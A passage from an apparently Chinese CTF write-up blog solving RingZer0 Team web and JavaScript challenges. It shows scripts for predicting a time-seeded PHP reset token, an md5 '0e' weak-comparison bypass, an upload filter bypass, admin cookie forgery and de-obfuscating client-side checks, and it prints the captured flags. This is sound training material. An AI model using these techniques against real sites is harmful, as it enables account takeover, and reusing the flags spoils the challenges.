class="string">'http://captcha.ringzer0team.com:7421/captcha1.php'</span>,cookies=cookie,headers=headers,data=data)</div></pre></td></tr></table></figure></p>
<p>跑完后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Congrats The flag is &quot;9bc635d4385e8a1775ad98980f44eb7d1714f69b&quot;</div></pre></td></tr></table></figure></p>
<h1 id="Password-reset"><a href="#Password-reset" class="headerlink" title="Password reset"></a>Password reset</h1><p>有一个登陆框，需要用户名和密码，还有一个重置（reset）功能。题目提供了源码。如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset_username'</span>])) &#123;</div><div class="line">		srand(time());</div><div class="line">		$token =</div><div class="line">		rand(<span class="number">1000000000000000</span>,<span class="number">9999999999999999</span>);</div><div class="line"></div><div class="line">		$success = <span class="string">'&lt;div class="success"&gt;Reset password link has been sent to admin@youdontownthisemail.com. Please follow the link ...'</span></div><div class="line">		$hSql-&gt;FastQuery(<span class="string">'DELETE FROM chal_113 WHERE ip_addr = ?'</span>, <span class="keyword">array</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</div><div class="line">		$hSql-&gt;FastQuery(<span class="string">'insert into chal_113 values (?,?,?)'</span>, <span class="keyword">array</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>], $token, time() + <span class="number">3600</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(URL_HANDLE::GetInstance()-&gt;get-&gt;k != <span class="keyword">null</span>) &#123;</div><div class="line">		$result = reset($hSql-&gt;FastQuery(<span class="string">'SELECT * FROM chal_113 WHERE ip_addr = ? AND recovery_key = ? '</span>, <span class="keyword">array</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>], URL_HANDLE::GetInstance()-&gt;get-&gt;k)));</div><div class="line">		<span class="keyword">if</span>($hSql-&gt;RowCount() != <span class="number">0</span>) &#123;</div><div class="line">				<span class="keyword">if</span>($result-&gt;expired_time &gt; time()) &#123;</div><div class="line">						$success = <span class="string">'&lt;div class="success"&gt;Here\'s your new password: XXXXXXXXXXXXXX&lt;/div&gt;'</span>;</div><div class="line">				&#125; <span class="keyword">else</span> &#123;</div><div class="line">						$success = <span class="string">'&lt;div class="error"&gt;Expired recovery key!&lt;/div&gt;'</span>;</div><div class="line">				&#125;</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">				$success = <span class="string">'&lt;div class="error"&gt;Invalid recovery key!&lt;/div&gt;'</span>;</div><div class="line">		&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>伪随机数问题，还有就是关于unix时间戳的知识。目标很明确要对admin重置密码，当点了reset后，会根据当前的time生成一个token并存放在数据库中，这个就是下文的k值。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/8.jpg?raw=true" alt=""></p>
<p>注意图片中是：2017 06:39:41 -0400。记得计算上时差为4个小时。所以实际时间应该是2017-07-01 10:39:41。写一个php脚本，生成需要的16位的digit code。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$t = strtotime(<span class="string">'2017-07-01 10:39:41'</span>);</div><div class="line"><span class="keyword">echo</span>($t . <span class="string">"&lt;br&gt;"</span>);</div><div class="line">srand($t);</div><div class="line">$token = rand(<span class="number">1000000000000000</span>,<span class="number">9999999999999999</span>);</div><div class="line"><span class="keyword">echo</span> $token;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>上面代码在win平台下无法生成16位的code，这个不知道为什么。。。我换到unix环境后生成的token为 32933381064794967。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ringzer0team.com/challenges/113/?k=3293338106479496</div></pre></td></tr></table></figure></p>
<p>得到hint：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Here&apos;s your new password: Thi%P@s50rD!sM1n3*</div></pre></td></tr></table></figure></p>
<p>登陆，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-DlwwTV7vCQf4Dn281Yhb802x5U</div></pre></td></tr></table></figure></p>
<h1 id="PHP-Fairy"><a href="#PHP-Fairy" class="headerlink" title="PHP Fairy"></a>PHP Fairy</h1><p>有一个登陆框。题目给了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$output = <span class="string">""</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>])) &#123;</div><div class="line">  $content = file_get_contents(<span class="keyword">__FILE__</span>);</div><div class="line">  $content = preg_replace(<span class="string">'/FLAG\-[0-9a-zA-Z_?!.,]+/i'</span>, <span class="string">'FLAG-XXXXXXXXXXXXXXXXXXXXXXX'</span>, $content);</div><div class="line">  <span class="keyword">echo</span> <span class="string">'&lt;div class="code-highlight"&gt;'</span>;</div><div class="line">  highlight_string($content);</div><div class="line">  <span class="keyword">echo</span> <span class="string">'&lt;/div&gt;'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</div><div class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">'/^[^\W_]+$/'</span>, $_GET[<span class="string">'pass'</span>])) &#123;</div><div class="line">    $output = <span class="string">"Don't hack me please :("</span>;</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line"></div><div class="line">    $pass = md5(<span class="string">"admin1674227342"</span>);</div><div class="line">    <span class="keyword">if</span> ((((((((($_GET[<span class="string">'pass'</span>] == $pass)))) &amp;&amp; (((($pass !== $_GET[<span class="string">'pass'</span>]))))) || ((((($pass == $_GET[<span class="string">'pass'</span>])))) &amp;&amp; ((($_GET[<span class="string">'pass'</span>] !== $pass)))))))) &#123; <span class="comment">// Trolling u lisp masta</span></div><div class="line">      <span class="keyword">if</span> (strlen($pass) == strlen($_GET[<span class="string">'pass'</span>])) &#123;</div><div class="line">        $output = <span class="string">"&lt;div class='alert alert-success'&gt;FLAG-XXXXXXXXXXXXXXXXXXXXXXX&lt;/div&gt;"</span>;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $output = <span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"</span>;</div><div class="line">      &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      $output = <span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>考察php弱类型。经过md5加密后生成以0e开头的字符串，而以0e开头的字符串用<code>==</code>比较时会被转换成<code>0 == 0</code>即成立。而<code>!==</code> 不仅比较值，而且还会比较类型。所以我们只要传入pass的值为一个0e开头的值，并且长度为32位（$pass长度为32位），比如说：0e509367213418206700842008763514。</p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-K7PY48gt02T1yvoO9jzP694FztgR1jIS</div></pre></td></tr></table></figure></p>
<h1 id="Malicious-upload"><a href="#Malicious-upload" class="headerlink" title="Malicious upload"></a>Malicious upload</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/9.jpg?raw=true" alt=""></p>
<p>上传题，一般关注文件名后缀和content-type。经过fuzz：）知道，对filename，服务器端的检测时从左向右匹配<code>.xxx</code>，若遇到的第一个<code>.xxx</code>不是png则上传失败，另一个就是需要把content-type设置为<code>image/png</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/10.jpg?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-ve46i9UFtDh8Xd4hnqKRkP17</div></pre></td></tr></table></figure></p>
<h1 id="Security-through-obscurity"><a href="#Security-through-obscurity" class="headerlink" title="Security through obscurity!"></a>Security through obscurity!</h1><p>题目说：<code>You don&#39;t have admin access.</code>。一脸懵逼，抓包发现一个奇奇怪怪的cookie：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/11.jpg?raw=true" alt=""></p>
<p>看着。。就很像base64加密；)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">'Z3Vlc3QsZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTA4NzM2LGZhbHNlOjIyOWQ3NDU5MmQ5MjNiOThlZjA3NjViNTU5OTkyZDI1'</span>)</div><div class="line"><span class="string">b'guest,e738b099a664e00e,1498908736,false:229d74592d923b98ef0765b559992d25'</span></div></pre></td></tr></table></figure>
<p>后面那串感觉很像md5，解密无果。想想先尝试改改一些东西,，比如把guest改成admin，false改成true，base64加密后得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">YWRtaW4sZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTA4NzM2LHRydWU6MjI5ZDc0NTkyZDkyM2I5OGVmMDc2NWI1NTk5OTJkMjU=</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/12.jpg?raw=true" alt=""><br>所以基本可以断定后面那串是md5，发包后，提示<br>之后我把原始的包，没有改过cookie的包直接fowward掉后提示说：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Expired cookie.</div></pre></td></tr></table></figure></p>
<p>说明有时间限制，结合前面做过的题目推断<code>1498908736</code>是unix时间戳，它可以直接转换为<code>2017/7/1 19:32:16</code>。<br>接下来，从整体上看一下这个cookie，它被冒号<code>:</code>分为两段。所以：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">md5(&quot;guest,e738b099a664e00e,1498908736,false&quot;)  =&gt;  229d74592d923b98ef0765b559992d25</div></pre></td></tr></table></figure></p>
<p>不过，第二个值不清楚是如何生成的，也许只是个随机值。所以我们改一改，记得把unix时间戳改大一点不然会提示过期：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">md5(&quot;admin,e738b099a664e00e,1498999999,true&quot;) =&gt; 05fda7a65b3ac89393e7de85bc8db295</div><div class="line">base64(&quot;admin,e738b099a664e00e,1498999999,true:05fda7a65b3ac89393e7de85bc8db295&quot;)</div><div class="line">	=&gt; YWRtaW4sZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTk5OTk5LHRydWU6MDVmZGE3YTY1YjNhYzg5MzkzZTdkZTg1YmM4ZGIyOTU=</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/13.jpg?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-Feg03OSzWhxO03K94108100f</div></pre></td></tr></table></figure></p>
<h1 id="REST-in-peace"><a href="#REST-in-peace" class="headerlink" title="REST in peace"></a>REST in peace</h1><p>题目提示：Your goal is to get superadmin access<br>题目地址是：<a href="https://ringzer0team.com/challenges_page/web100_c0f8a764ea6592548917aaf18261f42c.php" target="_blank" rel="external">https://ringzer0team.com/challenges_page/web100_c0f8a764ea6592548917aaf18261f42c.php</a><br>直接访问会显示Access Denied。<br>抓包后在响应包头部发现奇怪的东东，见下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/14.jpg?raw=true" alt=""></p>
<p>发现是sha512加密，简单咯：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/15.jpg?raw=true" alt=""></p>
<p>将字符串admin经过sha512加密后，在请求包中添加Strong-Auth字段。发送后得到以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Document title										security level</div><div class="line">The secret of the universe.docx 						private</div><div class="line">Be Better In Bed By Richard MacDonald.docx 				public</div><div class="line">This file may contain a flag or not.docx 			extremely private</div></pre></td></tr></table></figure></p>
<p>然后，，然后我还没做出来。待续。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ringzer0team-web&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ringzer0team-js-writeup</title>
    <link href="http://yoursite.com/2017/06/30/%C2%96ringzer0team-js-writeup/"/>
    <id>http://yoursite.com/2017/06/30/ringzer0team-js-writeup/</id>
    <published>2017-06-30T05:19:46.000Z</published>
    <updated>2017-06-30T08:17:42.740Z</updated>
    
    <content type="html"><![CDATA[<p>未完待续..待续..<br><a id="more"></a></p>
<h1 id="Client-side-validation-is-so-secure"><a href="#Client-side-validation-is-so-secure" class="headerlink" title="Client side validation is so secure?"></a>Client side validation is so secure?</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/1.jpg?raw=true" alt=""></p>
<p>查看源代码，发现下面的js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">		<span class="comment">// Look's like weak JavaScript auth script :)</span></div><div class="line">		$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">			event.preventDefault()</div><div class="line">			<span class="keyword">var</span> u = $(<span class="string">"#cuser"</span>).val();</div><div class="line">			<span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</div><div class="line">			<span class="keyword">if</span>(u == <span class="string">"admin"</span> &amp;&amp; p == <span class="built_in">String</span>.fromCharCode(<span class="number">74</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">83</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">116</span>,<span class="number">73</span>,<span class="number">115</span>,<span class="number">83</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">101</span>)) &#123;</div><div class="line">				<span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;   </div><div class="line">					<span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</div><div class="line">				&#125;</div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">			&#125;</div><div class="line">		&#125;);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>用控制台运行一下得到密码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)</div><div class="line">&quot;JavaScriptIsSecure&quot;</div></pre></td></tr></table></figure></p>
<p>填入账号admin，密码JavaScriptIsSecure，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-66Jq5u688he0y46564481WRh</div></pre></td></tr></table></figure></p>
<h1 id="Is-hashing-more-secure"><a href="#Is-hashing-more-secure" class="headerlink" title="Is hashing more secure?"></a>Is hashing more secure?</h1><p>查看源代码，发现js：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">	event.preventDefault();</div><div class="line">	<span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</div><div class="line">	<span class="keyword">if</span>(Sha1.hash(p) == <span class="string">"b89356ff6151527e89c4f3e3d30c8e6586c63962"</span>) &#123;</div><div class="line">		<span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;   </div><div class="line">			<span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>工具网站：<a href="http://hashtoolkit.com" target="_blank" rel="external">http://hashtoolkit.com</a><br>得到密码为；adminz。填入，得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-bXNsYg9tLCaIX6h1UiQMmMYB</div></pre></td></tr></table></figure></p>
<h1 id="Then-obfuscation-is-more-secure"><a href="#Then-obfuscation-is-more-secure" class="headerlink" title="Then obfuscation is more secure?"></a>Then obfuscation is more secure?</h1><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">			// Look's like weak JavaScript auth script :)</div><div class="line">			var _0xc360=["\x76\x61\x6C","\x23\x63\x70\x61\x73\x73","\x61\x6C\x6B\x33","\x30\x32\x6C\x31","\x3F\x70\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x65\x72\x72\x6F\x72\x27\x3E\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x73\x6F\x72\x72\x79\x2E\x3C\x2F\x64\x69\x76\x3E","\x68\x74\x6D\x6C","\x23\x63\x72\x65\x73\x70\x6F\x6E\x73\x65","\x63\x6C\x69\x63\x6B","\x2E\x63\x5F\x73\x75\x62\x6D\x69\x74"];$(.c_submit)[click](function ()&#123;var _0xf382x1=$(#cpass)[val]();var _0xf382x2=alk3;if(_0xf382x1==02l1+_0xf382x2)&#123;if(document[location][href][indexOf](?p=)==-1)&#123;document[location]=document[location][href]+?p=+_0xf382x1;&#125; ;&#125; else &#123;$(#cresponse)[html](&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;);&#125; ;&#125; );</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>拖到<a href="http://ddecode.com/" target="_blank" rel="external">http://ddecode.com/</a><br>解一下得到如下代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">// Look's like weak JavaScript auth script :)</span></div><div class="line"><span class="keyword">var</span> _0xc360 = [<span class="string">"val"</span>, <span class="string">"#cpass"</span>, <span class="string">"alk3"</span>, <span class="string">"02l1"</span>, <span class="string">"?p="</span>, <span class="string">"indexOf"</span>, <span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;"</span>, <span class="string">"html"</span>, <span class="string">"#cresponse"</span>, <span class="string">"click"</span>, <span class="string">".c_submit"</span>];</div><div class="line"></div><div class="line">$(_0xc360[<span class="number">12</span>])[_0xc360[<span class="number">11</span>]](<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    <span class="keyword">var</span> _0xf382x1 = $(_0xc360[<span class="number">1</span>])[_0xc360[<span class="number">0</span>]]();    <span class="keyword">var</span> _0xf382x2 = _0xc360[<span class="number">2</span>];    <span class="keyword">if</span> (_0xf382x1 == _0xc360[<span class="number">3</span>] + _0xf382x2) &#123;        <span class="keyword">if</span> (<span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]][_0xc360[<span class="number">5</span>]](_0xc360[<span class="number">4</span>]) == <span class="number">-1</span>) &#123;            <span class="built_in">document</span>[_0xc360[<span class="number">7</span>]] = <span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]] + _0xc360[<span class="number">4</span>] + _0xf382x1;        &#125;;    &#125; <span class="keyword">else</span> &#123;        $(_0xc360[<span class="number">10</span>])[_0xc360[<span class="number">9</span>]](_0xc360[<span class="number">8</span>]);    &#125;;&#125;);</div></pre></td></tr></table></figure>
<p>自己再替换一下。总算能看了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> _0xc360 = [<span class="string">"val"</span>, <span class="string">"#cpass"</span>, <span class="string">"alk3"</span>, <span class="string">"02l1"</span>, <span class="string">"?p="</span>, <span class="string">"indexOf"</span>, <span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;"</span>, <span class="string">"html"</span>, <span class="string">"#cresponse"</span>, <span class="string">"click"</span>, <span class="string">".c_submit"</span>];</div><div class="line"></div><div class="line">$(<span class="string">".c_submit"</span>)[<span class="string">"click"</span>](<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </div><div class="line">	<span class="keyword">var</span> _0xf382x1 = $(<span class="string">"#cpass"</span>)[<span class="string">"val"</span>]();    </div><div class="line">	<span class="keyword">var</span> _0xf382x2 = <span class="string">"alk3"</span>;    </div><div class="line">	<span class="keyword">if</span> (_0xf382x1 == <span class="string">"02l1"</span> + _0xf382x2) &#123;        </div><div class="line">		<span class="keyword">if</span> (<span class="built_in">document</span>[<span class="string">"location"</span>][<span class="string">"href"</span>][<span class="string">"indexOf"</span>](<span class="string">"?p="</span>,) == <span class="number">-1</span>) &#123;            </div><div class="line">			<span class="built_in">document</span>[<span class="string">"location"</span>] = <span class="built_in">document</span>[<span class="string">"location"</span>][<span class="string">"href"</span>] + <span class="string">"?p="</span>, + _0xf382x1;        </div><div class="line">		&#125;;    </div><div class="line">	&#125; <span class="keyword">else</span> &#123;        </div><div class="line">		$(<span class="string">"#cresponse"</span>)[<span class="string">"html"</span>](<span class="string">"&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;"</span>);    </div><div class="line">	&#125;;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>所以密码是 02l1alk3，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-5PJne3T8d73UGv4SCqN44DXj</div></pre></td></tr></table></figure></p>
<h1 id="Why-not"><a href="#Why-not" class="headerlink" title="Why not?"></a>Why not?</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">	event.preventDefault();</div><div class="line">	<span class="keyword">var</span> k = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">176</span>,<span class="number">214</span>,<span class="number">205</span>,<span class="number">246</span>,<span class="number">264</span>,<span class="number">255</span>,<span class="number">227</span>,<span class="number">237</span>,<span class="number">242</span>,<span class="number">244</span>,<span class="number">265</span>,<span class="number">270</span>,<span class="number">283</span>);</div><div class="line">	<span class="keyword">var</span> u = $(<span class="string">"#cuser"</span>).val();</div><div class="line">	<span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</div><div class="line">	<span class="keyword">var</span> t = <span class="literal">true</span>;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(u == <span class="string">"administrator"</span>) &#123;</div><div class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; u.length; i++) &#123;</div><div class="line">			<span class="keyword">if</span>((u.charCodeAt(i) + p.charCodeAt(i) + i * <span class="number">10</span>) != k[i]) &#123;</div><div class="line">				$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">				t = <span class="literal">false</span>;</div><div class="line">				<span class="keyword">break</span>;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">		t = <span class="literal">false</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>(t) &#123;</div><div class="line">		<span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</div><div class="line">			<span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</div><div class="line">			&#125;</div><div class="line">	&#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>写一个js脚本。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	<span class="keyword">var</span> k = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">176</span>,<span class="number">214</span>,<span class="number">205</span>,<span class="number">246</span>,<span class="number">264</span>,<span class="number">255</span>,<span class="number">227</span>,<span class="number">237</span>,<span class="number">242</span>,<span class="number">244</span>,<span class="number">265</span>,<span class="number">270</span>,<span class="number">283</span>);</div><div class="line">	<span class="keyword">var</span> u = <span class="string">"administrator"</span>;</div><div class="line">	<span class="keyword">var</span> p = <span class="string">""</span>;</div><div class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; u.length; i++)&#123;</div><div class="line">		p += <span class="built_in">String</span>.fromCharCode(k[i] - i * <span class="number">10</span> - u.charCodeAt(i) );</div><div class="line">	&#125;</div><div class="line">	alert(p);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
